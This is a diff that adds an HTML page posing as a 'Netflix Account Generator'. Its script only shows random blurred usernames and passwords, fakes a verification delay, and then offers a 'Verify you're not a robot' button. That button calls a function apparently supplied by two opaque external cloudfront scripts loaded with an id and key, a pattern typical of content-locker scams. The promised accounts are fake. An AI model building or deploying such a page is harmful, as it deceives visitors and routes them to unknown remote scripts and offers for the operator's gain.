@@ -1,3 +1,165 @@
-<html>
-  <h1>hello\n</h1>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Login Generator</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400&display=swap');
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #0f0f1a;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(50, 50, 120, 0.2) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(100, 50, 120, 0.2) 0%, transparent 40%);
+            color: #e0e0e0;
+        }
+        .container {
+            background-color: rgba(30, 30, 50, 0.8);
+            padding: 2.5rem;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            text-align: center;
+            color: #00ffff;
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 1.8rem;
+        }
+        button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            background-color: #00ccff;
+            color: #000019;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-family: 'Orbitron', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            background-color: #00ffff;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+        }
+        .result {
+            margin-top: 20px;
+            text-align: left;
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(0, 204, 255, 0.3);
+        }
+        .result p {
+            margin: 10px 0;
+            font-family: 'Orbitron', sans-serif;
+        }
+        .blurred {
+            filter: blur(5px);
+            user-select: none;
+            color: #00ffff;
+        }
+        .robot-check {
+            text-align: center;
+            margin-top: 15px;
+            font-style: italic;
+            color: #00ccff;
+        }
+        #redirectButton {
+            display: none;
+            background-color: #ff3366;
+            margin-top: 15px;
+        }
+        #redirectButton:hover {
+            background-color: #ff6699;
+        }
+        .label {
+            display: inline-block;
+            width: 100px;
+            color: #00ccff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Netflix Account Generator</h1>
+        <button onclick="generateCredentials()">Generate</button>
+        <div class="result">
+            <p><span class="label">Email:</span> <span id="username" class="blurred"></span></p>
+            <p><span class="label">Password:</span> <span id="password" class="blurred"></span></p>
+        </div>
+        <p class="robot-check" id="robotCheck"></p>
+        <button id="redirectButton" onclick="_CJ()">Verify you're not a robot</button>
+    </div>
+
+    <script>
+        function generateCredentials() {
+            const usernameElement = document.getElementById('username');
+            const passwordElement = document.getElementById('password');
+            const robotCheckElement = document.getElementById('robotCheck');
+            const redirectButton = document.getElementById('redirectButton');
+
+            const username = generateUsername();
+            const password = generatePassword();
+
+            usernameElement.textContent = username;
+            passwordElement.textContent = password;
+
+            robotCheckElement.textContent = "Verifying player identity...";
+            redirectButton.style.display = 'none';
+
+            setTimeout(() => {
+                robotCheckElement.textContent = "Waiting for verification ...";
+                redirectButton.style.display = 'block';
+            }, 2000);
+        }
+
+        function generateUsername() {
+            const prefixes = ['Nova', 'Cyber', 'Quantum', 'Neon', 'Pixel', 'Synth', 'Glitch', 'Void'];
+            const suffixes = ['Striker', 'Phantom', 'Nexus', 'Pulse', 'Vector', 'Flux', 'Echo', 'Zen'];
+            const randomNumber = Math.floor(Math.random() * 1000);
+
+            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+            const randomSuffix = suffixes[Math.floor(Math.random() * suffixes.length)];
+
+            return `${randomPrefix}${randomSuffix}${randomNumber}`;
+        }
+
+        function generatePassword() {
+            const length = 12;
+            const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+';
+            let password = '';
+
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * charset.length);
+                password += charset[randomIndex];
+            }
+
+            return password;
+        }
+        
+    </script>
+    <script type="text/javascript">
+        var uuZgW_tfL_lamMtc={"it":4372859,"key":"b2856"};
+    </script>
+    <script src="https://d16w9e5gvnj8jg.cloudfront.net/d4a3edf.js"></script>
+    <script src="https://dxnp0xi26y9q.cloudfront.net/c537442.js"></script>
+</body>
 </html>
